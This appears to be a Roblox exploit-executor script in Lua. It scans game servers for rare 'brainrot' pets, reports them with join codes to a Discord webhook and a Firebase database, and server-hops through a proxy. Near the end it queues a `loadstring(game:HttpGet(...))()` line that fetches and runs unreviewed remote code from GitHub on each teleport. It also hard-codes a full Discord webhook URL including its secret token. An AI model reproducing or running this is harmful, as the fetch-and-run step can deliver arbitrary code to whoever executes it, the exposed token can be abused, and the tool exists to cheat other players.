repeat task.wait() until game:IsLoaded()
task.wait(1)

local Players=game:GetService("Players")
local TeleportService=game:GetService("TeleportService")
local HttpService=game:GetService("HttpService")
local player=Players.LocalPlayer
local PlaceId=game.PlaceId
local JobId=game.JobId
local FIREBASE_URL="https://auto-join-logs-default-rtdb.firebaseio.com/brainrots.json"
local Webhook_URL="https://discord.com/api/webhooks/1434613898270736530/ZUgzRA73I65rxaKgrSMciek-nX11l_pq4H-8Nwx9kB2FcDlPtmwDsIbe6iYNhBkez9Jp"
local MIN_MILLIONS=1
local ALLOWED_RARITIES={"Secret","OG"}
local PROXY="https://brotato-three.vercel.app/games/v1/games/"
local PAGE_LIMIT=100
local teleportFunc=queueonteleport or queue_on_teleport

local function parseMoney(text)
	if not text or text==""then return 0 end
	text=text:gsub(",",""):upper()
	local num=tonumber(text:match("[%d%.]+"))or 0
	if text:find("Q")then return num*1_000_000_000 end
	if text:find("T")then return num*1_000_000 end
	if text:find("B")then return num*1_000 end
	if text:find("M")then return num end
	if text:find("K")then return num/1000 end
	return num
end

local function sendWebhook(displayName,rarity,money,players)
	local data={["content"]="",["embeds"]={{["title"]="🐾 **Brainrot Found!**",["color"]=tonumber(0x00FFFF),["fields"]={
		{["name"]="🐶 Name",["value"]=tostring(displayName or"Unknown"),["inline"]=true},
		{["name"]="🌟 Rarity",["value"]=tostring(rarity or"N/A"),["inline"]=true},
		{["name"]="💸 Money Per Second",["value"]=tostring(money).."M",["inline"]=true},
		{["name"]="👥 Players",["value"]=tostring(players).."/8",["inline"]=true},
		{["name"]="🧩 Join Code:",["value"]="```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(109983668079237,'" .. JobId .. "',game.Players.LocalPlayer)\n```",["inline"]=false}
	}}}}
	pcall(function()request({Url=Webhook_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(data)})end)
end

local function sendToFirebase(data)
	request({Url=FIREBASE_URL,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(data)})
end

local function scanServer()
	local brainrots={}
	for _,d in ipairs(workspace:GetDescendants())do
		if d.Name=="AnimalOverhead"and d:IsA("BillboardGui")then
			local g=d:FindFirstChild("Generation")
			local n=d:FindFirstChild("DisplayName")
			local r=d:FindFirstChild("Rarity")
			if g and n and r then
				local money=parseMoney(g.Text)
				if table.find(ALLOWED_RARITIES,r.Text) and money>=MIN_MILLIONS then
					table.insert(brainrots,{Name=n.Text,Rarity=r.Text,Money=money,Players=#Players:GetPlayers(),JobId=JobId,PlaceId=PlaceId,Time=os.time()})
				end
			end
		end
	end
	if #brainrots>0 then
		for _,info in ipairs(brainrots)do
			sendToFirebase(info)
			sendWebhook(info.Name,info.Rarity,info.Money,info.Players)
		end
		return true
	end
	return false
end

local function getAvailableServers()
	while true do
		local cursor=""
		repeat
			local url
			if cursor=="" then
				url=string.format("%s%s/servers/Public?sortOrder=Asc&limit=%d",PROXY,PlaceId,PAGE_LIMIT)
			else
				url=string.format("%s%s/servers/Public?sortOrder=Asc&limit=%d&cursor=%s",PROXY,PlaceId,PAGE_LIMIT,cursor)
			end

			local ok,res=pcall(function()return game:HttpGet(url)end)
			if ok then
				local data=HttpService:JSONDecode(res)
				if data and data.data then
					for _,server in ipairs(data.data)do
						if server.id~=JobId and server.playing<server.maxPlayers then
							return server.id
						end
					end
				end
				cursor=data.nextPageCursor or ""
			else
				cursor=""
			end
		until cursor==""
		task.wait(0)
	end
end

local function serverHop()
	local id=getAvailableServers()
	task.wait(1.5)
	TeleportService:TeleportToPlaceInstance(PlaceId,id,player)
end

local found=scanServer()

if teleportFunc then
	teleportFunc([[loadstring(game:HttpGet("https://raw.githubusercontent.com/elproscriptos/Scripts/refs/heads/main/e"))()]])
end

serverHop()
